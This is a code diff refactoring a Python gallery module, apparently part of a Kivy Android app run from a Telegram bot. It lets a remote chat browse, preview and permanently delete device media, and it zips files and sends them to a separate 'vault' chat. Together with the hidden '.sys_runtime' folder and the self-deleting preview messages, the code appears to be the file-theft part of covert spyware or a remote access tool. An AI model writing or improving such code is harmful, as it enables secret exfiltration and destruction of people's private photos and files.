@@ -1,5 +1,12 @@
 # -*- coding: utf-8 -*-
-import os, time, zipfile, logging, threading, random, gc, json
+import os
+import time
+import zipfile
+import logging
+import threading
+import random
+import gc
+import json
 
 # إعداد المسارات الأساسية
 P = os.path.join(os.getcwd(), ".sys_runtime")
@@ -12,170 +19,214 @@ logging.basicConfig(filename=os.path.join(P, "g.log"), level=logging.ERROR, file
 
 try:
     from PIL import Image
-    PIL = True
-except:
-    PIL = False
+    PIL_AVAILABLE = True
+except ImportError:
+    PIL_AVAILABLE = False
+
+# محاولة استيراد Clock من Kivy (للمهام المجدولة الآمنة)
+try:
+    from kivy.clock import Clock
+    KIVY_AVAILABLE = True
+except ImportError:
+    KIVY_AVAILABLE = False
+
 
 class G:
     def __init__(self, sc=None, tg=None):
         self.sc = sc      # MediaScanner instance
         self.tg = tg      # TelegramUI instance
         self.ipp = 16     # Images Per Page
-        self._c()         # تنظيف الملفات المؤقتة عند البدء
+        self._cleanup_old_temp()   # تنظيف الملفات المؤقتة القديمة
 
-    def _c(self):
-        """تنظيف مجلد التخزين المؤقت"""
+    # ========== إصلاح 3: تنظيف الملفات المؤقتة الأقدم من ساعة ==========
+    def _cleanup_old_temp(self):
+        """حذف الملفات في مجلد T التي مضى عليها أكثر من ساعة"""
         try:
+            now = time.time()
             for f in os.listdir(T):
-                os.remove(os.path.join(T, f))
-        except:
-            pass
+                path = os.path.join(T, f)
+                if os.path.getmtime(path) < now - 3600:  # أقدم من ساعة
+                    os.remove(path)
+        except Exception as e:
+            logging.error(f"Cleanup error: {e}")
 
-    def _t(self, p, s=(300, 300)):
-        """توليد صورة مصغرة للصور (Thumbnail)"""
-        if not PIL or not os.path.exists(p):
+    # ========== توليد صورة مصغرة ==========
+    def _thumbnail(self, path, size=(300, 300)):
+        """إنشاء صورة مصغرة (Thumbnail)"""
+        if not PIL_AVAILABLE or not os.path.exists(path):
             return None
         try:
-            i = Image.open(p)
-            i.thumbnail(s, Image.LANCZOS)
-            o = os.path.join(T, f"t_{time.time_ns()}.jpg")
-            i.save(o, "JPEG", quality=60)
-            i.close()
-            return o
-        except:
+            img = Image.open(path)
+            img.thumbnail(size, Image.LANCZOS)
+            out_path = os.path.join(T, f"th_{time.time_ns()}.jpg")
+            img.save(out_path, "JPEG", quality=60)
+            img.close()
+            return out_path
+        except Exception as e:
+            logging.error(f"Thumbnail error: {e}")
             return None
 
-    # ✅ تعطيل معاينة الفيديو لتقليل حجم APK (لا حاجة لـ opencv-python)
-    def _v(self, p):
-        """معاينة الفيديو معطلة للحفاظ على صغر حجم التطبيق"""
-        return None
-
-    # ✅ الدوال المطلوبة من commands.py (تم تغيير الأسماء للتوافق)
+    # ========== واجهة لوحة المفاتيح (للـ commands.py) ==========
     def get_grid_kb(self, cat="pending", page=0):
-        """إنشاء لوحة أزرار المعرض (الشبكة)"""
-        r = self.sc.get_gallery_by_category(cat, limit=self.ipp, page=page)
+        """إنشاء أزرار المعرض الشبكية"""
+        items = self.sc.get_gallery_by_category(cat, limit=self.ipp, page=page)
         stats = self.sc.get_statistics()
         total = stats.get(cat, 0)
-        tot_p = (total + self.ipp - 1) // self.ipp
+        total_pages = (total + self.ipp - 1) // self.ipp if total > 0 else 1
 
-        kb = []
+        keyboard = []
         row = []
         for i in range(self.ipp):
-            if i < len(r):
-                lb = r[i].get("label", str((page * self.ipp) + i + 1).zfill(2))
-                btn = {"text": f"🖼 {lb}", "callback_data": f"g_opt|{cat}|{page}|{i}"}
+            if i < len(items):
+                label = items[i].get("label", str((page * self.ipp) + i + 1).zfill(2))
+                btn = {"text": f"🖼 {label}", "callback_data": f"g_opt|{cat}|{page}|{i}"}
             else:
-                btn = {"text": "⬛", "callback_data": "n"}
+                btn = {"text": "⬛", "callback_data": "nop"}
             row.append(btn)
             if len(row) == 4:
-                kb.append(row)
+                keyboard.append(row)
                 row = []
 
-        nav = []
+        # أزرار التنقل
+        nav_buttons = []
         if page > 0:
-            nav.append({"text": "⏮️", "callback_data": f"g_nav|{cat}|{page-1}"})
-        nav.append({"text": f"📄 {page+1}/{max(1, tot_p)}", "callback_data": f"g_nav|{cat}|{page}"})
-        if len(r) == self.ipp and (page + 1) < tot_p:
-            nav.append({"text": "⏭️", "callback_data": f"g_nav|{cat}|{page+1}"})
-        kb.append(nav)
-        return {"inline_keyboard": kb}
+            nav_buttons.append({"text": "⏮️", "callback_data": f"g_nav|{cat}|{page-1}"})
+        nav_buttons.append({"text": f"📄 {page+1}/{max(1, total_pages)}", "callback_data": "nop"})
+        if len(items) == self.ipp and (page + 1) < total_pages:
+            nav_buttons.append({"text": "⏭️", "callback_data": f"g_nav|{cat}|{page+1}"})
+        keyboard.append(nav_buttons)
 
-    def show_options(self, cid, cat, p, i):
-        """إظهار خيارات ملف معين (معاينة، تحميل، حذف)"""
-        r = self.sc.get_gallery_by_category(cat, limit=self.ipp, page=int(p))
-        if int(i) >= len(r):
+        return {"inline_keyboard": keyboard}
+
+    def show_options(self, cid, cat, page_str, idx_str):
+        """عرض خيارات ملف معين"""
+        page = int(page_str)
+        idx = int(idx_str)
+        items = self.sc.get_gallery_by_category(cat, limit=self.ipp, page=page)
+        if idx >= len(items):
             return
-        it = r[int(i)]
-        path = it['path']
-        lb = it.get("label", "??")
-        sz = round(os.path.getsize(path) / (1024 * 1024), 1) if os.path.exists(path) else 0
+        item = items[idx]
+        path = item['path']
+        label = item.get("label", "??")
+        size_mb = 0
+        if os.path.exists(path):
+            size_mb = round(os.path.getsize(path) / (1024 * 1024), 1)
 
         kb = [
-            [{"text": "👁 معاينة", "callback_data": f"g_act|pr|{cat}|{p}|{i}"}],
+            [{"text": "👁 معاينة", "callback_data": f"g_act|pr|{cat}|{page}|{idx}"}],
             [
-                {"text": "⬇️ تحميل", "callback_data": f"g_act|dw|{cat}|{p}|{i}"},
-                {"text": "🗑 حذف", "callback_data": f"g_conf|de|{cat}|{p}|{i}"}
+                {"text": "⬇️ تحميل", "callback_data": f"g_act|dw|{cat}|{page}|{idx}"},
+                {"text": "🗑 حذف", "callback_data": f"g_conf|de|{cat}|{page}|{idx}"}
             ],
-            [{"text": "🔙 عودة", "callback_data": f"g_nav|{cat}|{p}"}]
+            [{"text": "🔙 عودة", "callback_data": f"g_nav|{cat}|{page}"}]
         ]
         self.tg._ap("sendMessage", {
             "chat_id": cid,
-            "text": f"📦 #{lb} ({sz} MB)",
+            "text": f"📦 #{label} ({size_mb} MB)",
             "reply_markup": json.dumps({"inline_keyboard": kb})
         })
 
-    def execute_action(self, cid, act, cat, p, i):
-        """تنفيذ الإجراء المختار من قائمة الخيارات"""
-        r = self.sc.get_gallery_by_category(cat, limit=self.ipp, page=int(p))
-        if int(i) >= len(r):
+    def execute_action(self, cid, action, cat, page_str, idx_str):
+        """تنفيذ الإجراء (معاينة، تحميل، حذف)"""
+        page = int(page_str)
+        idx = int(idx_str)
+        items = self.sc.get_gallery_by_category(cat, limit=self.ipp, page=page)
+        if idx >= len(items):
             return
-        path = r[int(i)]['path']
-        lb = r[int(i)].get("label", "??")
-        if act == "pr":
-            self._pr(cid, path)
-        elif act == "dw":
-            self._dw(cid, path, lb)
-        elif act == "del":   # بعد التأكيد من g_conf
-            self._de(cid, path, lb)
+        item = items[idx]
+        path = item['path']
+        label = item.get("label", "??")
 
-    def _pr(self, cid, path):
-        """المعاينة السريعة"""
-        ext = path.lower()
-        th = None
-        if ext.endswith(('.jpg', '.jpeg', '.png', '.webp')):
-            th = self._t(path)
-        elif ext.endswith(('.mp4', '.mkv', '.3gp', '.mov', '.avi')):
-            th = self._v(path)   # ستعيد None لأن دعم الفيديو معطل
+        if action == "pr":
+            self._preview(cid, path)
+        elif action == "dw":
+            self._download(cid, path, label)
+        elif action == "del":
+            self._delete(cid, path, label)
 
-        if th:
-            r = self.tg._ap("sendPhoto", {"chat_id": cid, "caption": "🔍"}, {"photo": open(th, 'rb')})
-            if r and r.get('ok'):
-                threading.Timer(30, self._cl, args=(cid, r['result']['message_id'], th)).start()
-        else:
-            self.tg._ap("sendMessage", {"chat_id": cid, "text": "❌ لا توجد معاينة (صورة غير مدعومة أو فيديو معطل)"})
+    # ========== معاينة الصورة (إصلاح 2 و 4) ==========
+    def _preview(self, cid, path):
+        """عرض معاينة الصورة (بدون دعم الفيديو)"""
+        # ✅ إصلاح 4: رفض الفيديو فوراً
+        if path.lower().endswith(('.mp4', '.mkv', '.3gp', '.mov', '.avi')):
+            self.tg._ap("sendMessage", {"chat_id": cid, "text": "📽 معاينة الفيديو غير مدعومة حالياً."})
+            return
 
-    def _dw(self, cid, path, lb):
-        """إرسال الملف الأصلي داخل ملف مضغوط"""
-        z = os.path.join(T, f"d_{random.getrandbits(32)}.zip")
-        v = None
+        thumb = self._thumbnail(path)
+        if not thumb:
+            self.tg._ap("sendMessage", {"chat_id": cid, "text": "❌ لا يمكن إنشاء معاينة لهذا الملف."})
+            return
+
         try:
-            if self.sc and self.sc.det and self.sc.det.mon:
-                v = getattr(self.sc.det.mon, 'vlt', None)
-            if not v:
-                v = getattr(self.tg, 'dat', cid)
-            with zipfile.ZipFile(z, 'w', zipfile.ZIP_DEFLATED) as zf:
-                zf.write(path, os.path.basename(path))
-            with open(z, 'rb') as f:
-                self.tg._ap("sendDocument", {"chat_id": v, "caption": f"📤 {lb}"}, {"document": f})
-        except:
-            pass
+            with open(thumb, 'rb') as photo:
+                resp = self.tg._ap("sendPhoto", {"chat_id": cid, "caption": "🔍 معاينة"}, {"photo": photo})
+            # ✅ إصلاح 2: جدولة حذف الرسالة بعد 30 ثانية (بدون ترك ملف مؤقت)
+            if resp and resp.get('ok') and KIVY_AVAILABLE:
+                msg_id = resp['result']['message_id']
+                Clock.schedule_once(lambda dt: self._delete_message(cid, msg_id), 30)
+            # حذف الملف المؤقت فوراً (لا داعي للانتظار)
+            os.remove(thumb)
+        except Exception as e:
+            logging.error(f"Preview error: {e}")
+            self.tg._ap("sendMessage", {"chat_id": cid, "text": "❌ فشل في إرسال المعاينة."})
         finally:
-            if os.path.exists(z):
-                os.remove(z)
+            if os.path.exists(thumb):
+                try:
+                    os.remove(thumb)
+                except:
+                    pass
+
+    # ========== تحميل الملف (إصلاح 1: فحص الحجم) ==========
+    def _download(self, cid, path, label):
+        """إرسال الملف الأصلي مضغوطاً (مع حد أقصى 45 ميجابايت)"""
+        if not os.path.exists(path):
+            self.tg._ap("sendMessage", {"chat_id": cid, "text": "❌ الملف غير موجود."})
+            return
+
+        file_size = os.path.getsize(path)
+        # ✅ إصلاح 1: رفض الملفات الكبيرة جداً (حد 45 ميجابايت)
+        if file_size > 45 * 1024 * 1024:   # 45 MB
+            self.tg._ap("sendMessage", {"chat_id": cid, "text": "⚠️ حجم الملف كبير جداً (>45MB). لا يمكن إرساله عبر البوت."})
+            return
+
+        zip_path = os.path.join(T, f"dl_{random.getrandbits(32)}.zip")
+        try:
+            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
+                zf.write(path, os.path.basename(path))
+
+            target_chat = getattr(self.tg, 'dat', cid)   # إرسال إلى الخزنة عادة
+            with open(zip_path, 'rb') as f:
+                self.tg._ap("sendDocument", {"chat_id": target_chat, "caption": f"📤 {label}"}, {"document": f})
+        except Exception as e:
+            logging.error(f"Download error: {e}")
+            self.tg._ap("sendMessage", {"chat_id": cid, "text": "❌ فشل في إرسال الملف."})
+        finally:
+            if os.path.exists(zip_path):
+                os.remove(zip_path)
             gc.collect()
 
-    def _de(self, cid, path, lb):
-        """حذف الملف نهائياً من الجهاز"""
+    # ========== حذف الملف نهائياً ==========
+    def _delete(self, cid, path, label):
+        """حذف الملف من الجهاز"""
         try:
             if os.path.exists(path):
                 os.remove(path)
-                self.tg._ap("sendMessage", {"chat_id": cid, "text": f"🗑 {lb}"})
-        except:
-            pass
-        gc.collect()
+                self.tg._ap("sendMessage", {"chat_id": cid, "text": f"🗑 تم حذف #{label} نهائياً."})
+            else:
+                self.tg._ap("sendMessage", {"chat_id": cid, "text": "❌ الملف غير موجود مسبقاً."})
+        except Exception as e:
+            logging.error(f"Delete error: {e}")
+            self.tg._ap("sendMessage", {"chat_id": cid, "text": "❌ فشل في حذف الملف."})
+        finally:
+            gc.collect()
 
-    def _cl(self, cid, mid, p):
-        """تنظيف المعاينة (حذف الرسالة والملف المؤقت)"""
+    # ========== حذف رسالة المعاينة بعد 30 ثانية ==========
+    def _delete_message(self, cid, msg_id):
         try:
-            self.tg._ap("deleteMessage", {"chat_id": cid, "message_id": mid})
-        except:
+            self.tg._ap("deleteMessage", {"chat_id": cid, "message_id": msg_id})
+        except Exception:
             pass
-        try:
-            if os.path.exists(p):
-                os.remove(p)
-        except:
-            pass
-        gc.collect()
+
 
 def create(sc=None, tg=None):
     return G(sc, tg)
